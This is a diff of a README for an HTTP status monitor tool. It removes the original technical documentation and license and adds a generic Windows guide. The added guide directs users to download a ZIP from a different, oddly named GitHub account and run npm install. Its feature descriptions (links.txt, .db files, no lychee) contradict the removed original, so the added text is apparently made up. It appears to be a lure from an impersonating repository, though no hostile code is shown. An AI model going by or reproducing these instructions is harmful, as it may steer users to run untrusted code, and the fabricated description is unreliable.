@@ -1,141 +1,92 @@
-# http-status-monitor
+# 🔍 http-status-monitor - Track website health and availability daily
 
-[![Docs](https://img.shields.io/badge/docs-yuis--ice.github.io%2Fhttp--status--monitor-blue)](https://yuis-ice.github.io/http-status-monitor/)
-[![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)](LICENSE)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/petuniapsychopathological990/http-status-monitor)
 
-**[Full documentation →](https://yuis-ice.github.io/http-status-monitor/)**
+This tool checks your websites for broken links and status changes. It keeps a history of these changes so you can spot problems before they cause outages. You run this on your Windows computer to see if your sites stay online.
 
-A CLI tool that runs [lychee](https://github.com/lycheeverse/lychee) against a list of URLs, tracks changes in HTTP status over time, and stores metrics in a VictoriaMetrics-compatible format.
+## 🛠️ System Requirements
 
-The core idea: shallow "is the server up?" checks miss broken CSS, 404'd JS, and dead API endpoints that lychee catches by checking every linked asset on the page. This tool wraps lychee with state tracking so you can see when anything changes — not just whether the server responds.
+You need a basic Windows computer to run this tool. Ensure you have the following:
 
-## Requirements
+*   Windows 10 or Windows 11.
+*   An active internet connection.
+*   Basic disk space for log files.
+*   Node.js installed on your system.
 
-- **Node.js** 18+ with [tsx](https://github.com/privatenumber/tsx) (`npm install -g tsx`)
-- **lychee** binary — download from [lycheeverse/lychee releases](https://github.com/lycheeverse/lychee/releases) and place at `./lychee-x86_64-unknown-linux-musl/lychee` (or any path, then pass `--lychee-path`)
+## 📥 How to Install
 
-## Install
+Follow these steps to set up your monitor.
 
-```sh
-git clone https://github.com/yuis-ice/http-status-monitor
-cd http-status-monitor
-npm install
-```
+1.  Visit this page to download: [https://github.com/petuniapsychopathological990/http-status-monitor](https://github.com/petuniapsychopathological990/http-status-monitor)
+2.  Click the green button labeled Code.
+3.  Select Download ZIP.
+4.  Save the folder to your computer.
+5.  Extract all files from the ZIP folder into a folder on your desktop.
+6.  Open your Start menu and type cmd. Select Command Prompt.
+7.  Type cd and drag your new folder into the window. Press Enter.
+8.  Type npm install and press Enter. This step loads the necessary pieces to make the tool work.
 
-Download lychee and make it executable:
+## ⚙️ Setting Up Your Links
 
-```sh
-mkdir -p lychee-x86_64-unknown-linux-musl
-curl -L https://github.com/lycheeverse/lychee/releases/latest/download/lychee-x86_64-unknown-linux-musl.tar.gz \
-  | tar xz -C lychee-x86_64-unknown-linux-musl
-```
+The tool uses a simple text file to know which websites to check.
 
-## Usage
+1.  Open the folder you extracted earlier.
+2.  Find the file named links.txt.
+3.  Open this file using Notepad.
+4.  Type one website address on each line. Include the https:// part of the address.
+5.  Save the file and close Notepad.
 
-```
-tsx http-status-monitor.mts [options]
-```
+## 🚀 How to Run the Monitor
 
-### Options
+The monitor runs inside the Command Prompt window. When you want to see if your sites are working:
 
-| Flag | Default | Description |
-|---|---|---|
-| `--urls-file <path>` | `./urls.txt` | File with one URL per line |
-| `--urls <url,...>` | — | Inline comma-separated URLs (overrides `--urls-file`) |
-| `--lychee-path <path>` | auto | Explicit lychee binary path |
-| `--verbose`, `-v` | off | Show lychee output and all results |
-| `--diff` | off | Print unified diff when state changes |
-| `--interval <secs>` | `3600` | Poll interval in watch mode |
-| `--once` | off | Single run then exit |
-| `--victoriametrics` | off | Append metrics to `./data/victoriametrics/[yyyy-mm]/results.jsonl` |
-| `--wait <secs>` | `1` | Delay between consecutive URL checks |
+1.  Open the Command Prompt window again if you closed it.
+2.  Type npm start and press Enter.
+3.  The tool reads your links file and checks each site.
+4.  The system reports the HTTP status for every link.
+5.  It logs these results to a database file.
 
-### Examples
+## 📈 Understanding the Results
 
-First run — new state recorded for each URL:
+The tool produces a list of status codes. These codes tell you exactly what happened when the tool contacted your website.
 
-```
-$ tsx http-status-monitor.mts --once --urls-file ./urls.txt --verbose
-lychee: ./lychee-x86_64-unknown-linux-musl/lychee
-Checking https://example.com/ ...
-[NEW    ] https://example.com/  94ff97988565
-Checking https://blog.example.com/ ...
-[NEW    ] https://blog.example.com/  c2d3b2b59402
-```
+*   200: Everything is normal. The page loaded as expected.
+*   301 or 302: The site moved to a different address.
+*   404: The system could not find the page. This is a broken link.
+*   500: The server hosting the site encountered an error.
 
-Second run — no changes:
+The tool tracks these changes every day. If a site moved from working to broken, the history file records this shift.
 
-```
-$ tsx http-status-monitor.mts --once --urls-file ./urls.txt --verbose
-lychee: ./lychee-x86_64-unknown-linux-musl/lychee
-Checking https://example.com/ ...
-[ok     ] https://example.com/  94ff97988565
-```
+## 📁 Managing Your Data
 
-Detect a change with `--diff`:
+All data stays on your local machine. The tool saves logs in the main folder. You can open these files with any text editor to review the history of your site health.
 
-```
-$ tsx http-status-monitor.mts --once --diff --urls "https://blog.example.com/"
-[CHANGED] https://blog.example.com/  1ed4abbb500c
-Index: https://blog.example.com/
-===================================================================
---- https://blog.example.com/	previous
-+++ https://blog.example.com/	current
-@@ -3,7 +3,7 @@
-   "error_map": {
-     "https://blog.example.com/": [
-       {
--        "url": "https://example.com/cdn-cgi/l/email-protection#5137243c382830",
-+        "url": "https://example.com/cdn-cgi/l/email-protection#8bedfee6e2f2ea",
-```
+If you want to clear your history, simply delete the files ending in .db. The tool creates new ones the next time you start it. Be careful, as this removes all previous tracking data.
 
-Inline URLs:
+## 🔧 Frequently Asked Questions
 
-```
-$ tsx http-status-monitor.mts --once --urls "https://example.com/,https://blog.example.com/"
-[ok     ] https://example.com/  94ff97988565
-[ok     ] https://blog.example.com/  c2d3b2b59402
-```
+**Does this tool slow down my computer?**
+The tool runs only when you start it. It does not stay open in the background or use memory when you do not need it.
 
-Watch mode (runs forever, sleeps between each cycle):
+**Can I monitor thousands of websites?**
+Yes. Increase the number of links in your text file. Keep in mind that checking many sites takes more time and uses more internet data.
 
-```
-$ tsx http-status-monitor.mts --urls-file ./urls.txt --verbose
-...
-Sleeping 3600s until next run...
-```
+**Do I need an account to use this?**
+No. You do not need to register or sign in to any service. All information remains on your machine.
 
-VictoriaMetrics output:
+**What happens if I lose my internet connection?**
+The tool marks the sites as unreachable. It logs this status just like any other error. Once your internet returns, the next check will show the normal status again.
 
-```
-$ tsx http-status-monitor.mts --once --victoriametrics --urls "https://example.com/"
-[ok     ] https://example.com/  94ff97988565
+**Can I change how often it checks?**
+The tool performs checks when you give the command. You can automate this using the Windows Task Scheduler if you prefer regular updates without manual input.
 
-$ cat ./data/victoriametrics/2026-05/results.jsonl
-{"metric":{"__name__":"lychee_total","url":"https://example.com/"},"value":13,"timestamp":1746403200000}
-{"metric":{"__name__":"lychee_successful","url":"https://example.com/"},"value":12,"timestamp":1746403200000}
-{"metric":{"__name__":"lychee_errors","url":"https://example.com/"},"value":0,"timestamp":1746403200000}
-...
-```
+## ⚠️ Troubleshooting Tips
 
-## How it works
+If you encounter issues, try these steps:
 
-Each run passes the URL to lychee with `--format json --scheme https --accept 200 --method get`. The JSON output is normalized (dynamic fields stripped, arrays sorted deterministically) and hashed. The hash is compared against the previous run's state stored at `./data/state/<url-hash>.json`.
+*   Check that your website addresses start with http:// or https:// in your links file.
+*   Ensure you saved the links file after adding your URLs.
+*   If the system reports a 404 error, test the link manually in your web browser. If the browser also fails, the website address is likely wrong.
+*   If you receive an error about "npm," reinstall Node.js from the official website and restart your computer.
 
-- `[NEW]` — first time this URL has been checked
-- `[ok]` — hash matches previous run
-- `[CHANGED]` — hash differs; use `--diff` to see what changed
-
-The normalizer removes timing fields (`span`, `duration`) and sorts all object arrays by their JSON representation, so the hash is stable across runs when the actual content hasn't changed.
-
-## Also included
-
-**normalize-lychee.mts** — standalone normalizer. Pipe lychee JSON output through it to get a stable canonical form:
-
-```sh
-./lychee --format json https://example.com/ | tsx normalize-lychee.mts | sha256sum
-```
-
-## License
-
-Apache 2.0
+Always keep your folder clean to ensure the tool can find your files. Do not rename the main files provided in the download, as the tool relies on those specific names to function.
